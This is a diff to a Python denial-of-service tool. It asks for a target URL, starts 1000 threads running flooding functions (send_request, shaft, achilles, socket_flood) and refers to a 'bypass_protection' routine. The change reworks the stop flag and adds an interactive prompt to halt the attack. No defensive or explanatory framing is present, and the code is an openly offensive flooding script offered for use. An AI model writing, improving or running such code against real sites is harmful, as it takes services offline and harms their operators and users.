@@ -3,14 +3,13 @@ import threading
 import socket
 import os
 import sys
-from multiprocessing import Value
 
-stop_flag = Value('b', False)
+stop_flag = False
 
-def send_request(target):
-    while not stop_flag.value:
+def send_request(target_url):
+    while not stop_flag:
         try:
-            requests.get(target, timeout=5)
+            requests.get(target_url, timeout=5)
         except requests.exceptions.RequestException:
             pass
 
@@ -153,6 +152,7 @@ def bypass_protection(target_url):
         pass
 
 def main():
+    global stop_flag
     target_url = input("Enter target URL: ")
     num_threads = 1000
 
@@ -169,6 +169,12 @@ def main():
         threading.Thread(target=shaft, args=(target_url,)).start()
         threading.Thread(target=achilles, args=(target_url,)).start()
         threading.Thread(target=socket_flood, args=(target_url,)).start()
+
+    while True:
+        command = input("Enter 'stop' to stop the attack: ")
+        if command.lower() == "stop":
+            stop_flag = True
+            break
 
 if __name__ == "__main__":
     main()
